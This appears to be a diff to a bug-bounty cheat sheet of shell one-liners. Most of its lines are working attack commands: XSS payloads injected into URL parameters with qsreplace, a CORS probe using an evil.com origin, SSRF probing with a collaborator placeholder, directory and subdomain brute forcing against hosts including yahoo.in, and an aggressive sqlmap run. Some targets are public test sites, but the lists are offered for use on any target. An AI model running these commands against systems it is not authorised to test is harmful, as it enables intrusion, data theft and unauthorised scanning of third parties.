@@ -1,2 +1,10 @@
 sudomy -d domain.com -dP -eP -rS -cF -pS -tO -gW --httpx --dnsx  -aI webanalyze --slack -sS
 cat domains_with_bounties.txt | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
+cat targets.txt | grep "="| qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' 
+echo testphp.vulnweb.com  | waybackurls| qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+gau http://yahoo.in | antiburl | awk '{ print $4 }' | grep -E '(callback=|jsonp=|api=|id=|item=|page_id=|url=|from_url=|load_url=|file_url=|page_url=|file_name=|page=)' | qsreplace EnterYourCollabrater | concurl
+cat targets.txt | grep "="| gf xss | uro | httpx -silent | qsreplace '"&gt;&lt;svg onload=confirm(1)&gt;' | airixss -payload "confirm(1)" 
+kr brute testphp.vulnweb.com -A=httparchive_directories_1m_2023_10_28.txt -v info -o kr.txt
+gobuster dns -d yahoo.in -w 2m-subdomains.txt
+sqlmap -u https://testphp.vulnweb.com--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3
+for sub in $(cat domains);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done
